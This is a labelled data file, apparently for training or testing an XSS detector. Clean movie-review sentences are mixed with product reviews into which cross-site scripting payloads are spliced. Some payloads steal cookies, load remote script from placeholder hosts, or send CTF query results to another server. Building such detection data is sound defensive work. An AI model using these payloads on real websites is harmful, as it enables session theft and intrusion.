label	sentence
1	Not only did the software do a great job of this, I could also make my own ringtones form my existing CDs without&lt;XSS STYLE=\"xss&#58;expression(alert('XSS'))\"&gt; an internet connection.
0	The good cinematography also makes her and Monica Bellucci look very beautiful.
1	I got the car charger and not even after a week the charger was broken...I<iframe name="admin" src="https://bypasses-everywhere.ctf.insecurity-insa.fr/admin"></iframe> went to plug it in and it started smoking.
1	R&LT;DIV STYLE=\"BACKGROUND-IMAGE&#58;\0075\0072\006C\0028'\006A\0061\0076\0061\0073\0063\0072\0069\0070\0074\003A\0061\006C\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&GT;eally good product.
0	This is actually a very smart movie.
0	It's a feel-good film and that's how I felt when I came out of the cinema!
0	All in all a beautiful directed film from Nicola's roeg wih a sublime cast.
1	All the other cases I've tried normally fall apart after &lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;alert('XSS');\"&gt;a few months but this one seems to be in for the long haul.
0	The worst, sappiest dialogue... I could go on and on.
1	Th%253cscript%253ealert(document.cookie)%253c/script%253e?><<script>alert(document.cookie);//<</script>e handsfree part works fine, but then the car tries to download the address book, and the Treo reboots.Overall, I still rate this device high.
1	I cou<input/onmouseover="javascript&colon;confirm&lpar;1&rpar;"ld not recommend these more.
0	It features an outlandish array of memorable, psychotic but lovable nuts.
0	I would have casted her in that role after ready the script.
1	Not nearly<SVG ONLOAD="JAVASCRIPT:ALERT(123)" XMLNS="#"></SVG> as good looking as the AMAZON picture makes it look.
0	Didn't laugh or even smile once.
1	Great b<FORM><IFRAME &#09;&#10;&#11; SRC="JAVASCRIPT&#58;ALERT(1)"&#11;&#10;&#09;;>luetooth!.
1	Unf&LT;DIV STYLE=\"BACKGROUND-IMAGE&#58; URL(JAVASCRIPT&#058;ALERT('XSS'))\"&GT;ortunately it did not work.
0	 out of  for both the movie and trilogy.
1	Five star Plus, plus."><IFRAME ONLOAD="EVAL('D=DOCUMENT; _=D.CREATEELEMENT(\'SCRIPT\');_.SRC=\'\/\/DOMAIN/M\';D.BODY.APPENDCHILD(_)')">
0	The most annoying thing about 'Cover Girl' is the way in which Rita Hayworth is put up on a pedestal.
0	But the convoluted plot just didn't convince me, and much of the film was watched with a weird, questioning glance.
1	The tracfonewebsite is &lt;img src=\"jav&#x0d;ascript&#058;alert('xss');\"&gt;user friendly and makes it easy toactivate, etc.
1	Improper description.... I had to return it<H1><FONT COLOR=BLUE>HELLOX WORLDSS</H1>.
1	Easy to <iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innertext=/hello/"></script>'></iframe>pair with my Samsung Cell.
0	In a most wonderful location lies a story of contrast.
0	An AMAZING finale to possibly the BEST trilogy of all time!
1	If you li<table><td background="javascript:alert('xss')">ke a loud buzzing to override all your conversations, then this phone is for you!
0	All the characters in this film are tremendously well played.
1	Gets a signal when o&LT;BODY BACKGROUND=\"JAVASCRIPT&#058;ALERT('XSS')\"&GT;ther Verizon phones won't.
0	It really created a unique feeling though.
1	Because both ears are occupied, background is not javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+document.location=`//localhost/mh`//'>distracting at all.
0	Even if you love bad movies, do not watch this movie.
1	Batter<INPUT ONFOCUS=WRITE(XSS) AUTOFOCUS>y charge-life is quite long.
0	Unfortunately, this is a bad movie that is just plain bad.
0	I'm translating movies for a living and this is the first movie in my 5-year working experience that I found offensive to my intelligence.
1	So I had to ta%22/%3E%3CBODY%20ONLOAD=?DOCUMENT.WRITE(%22%3CS%22%2B%22CRIPT%20SRC=HTTP://MY.BOX.COM/XSS.JS%3E%3C/SCRIPT%3E%22)?%3Eke the battery out of the phone put it all back together and then restart it.
1	It works fine on my Motorola//<form/action=javascript&#x3a;alert&lpar;document&period;cookie&rpar;><input/type='submit'>// 325 cellphone, and a lot better than the worn-out battery did.
1	if you simply want a small flip phone -- look elsewhere as the extra bells &lt;img dynsrc=\"javascript&#058;alert('xss')\"&gt;& whistles are mediocre.
1	The camera on the phone may be used as a dustpan when indoors... I'd rather%2badw-script+ad4-alert(document.location)%2badw-/script%2bad4- be using a disposable then this.
1	This does not %22/%3E%3CBODY%20onload=?document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)?%3Efit the Palm Tungsten E2 and it broke the first time I tried to plug it in.
1	It felt too lig<scr<script>ipt>alert(document.cookie)</scr</script>ipt>ht and "tinny.".
0	If you check the director's filmography on this site you will see why this film didn't have a chance.
0	The ending is so, SO perfect... you'll shed a tear.
1	Just what I wantefoo\?; alert(document.cookie);//?;d.
0	The performances are real and gripping, the crocdodile is extremely well done, indeed if the Black Water website is to be believed that's because they used real crocs and the swamp location is fabulous.
0	I am so pleased to know such a modern day genius is out there , letting is passion for Art drive him and taking us as an audience with him.
0	I think it was Robert Ryans best film, because he portrayed someone like my father, and he was a schizophrenic in real life,(my father) although he never murdered anyone but was affected more so during the second world war which made him worse.
0	Camerawork - again, bad.
1	Much less than the jaw<form><isindex formaction="javascript&colon;confirm(1)"bone I was going to replace it with.
1	The instructions didn't e<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new image().src='http://player_server/?'+_)</script>xplain that a microphone jack could be used.
0	Conceptually, the show offers a little bit of everything- and for just about everybody (parents, kids, fantasy and/or fx fans).
1	The charger arrived within the promised timeframe, but it %2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-did not work.
0	Definitely worth checking out.
0	Here, in The Wind and the Lion, we see a wonderful rendering of America's own Imperial age.
0	The Malta settings are as dry and as barren as the dialogue.
1	At first I thought I was grttin<MATH><A XLINK:HREF="//JSFIDDLE.NET/T846H/">CLICKg a good deal at $7.44, until I plugged it into my phone (V3c Razr).
1	I own 2 of these cases and would order <A ID=X TABINDEX=1 ONFOCUSIN=ALERT(1)></A>another.
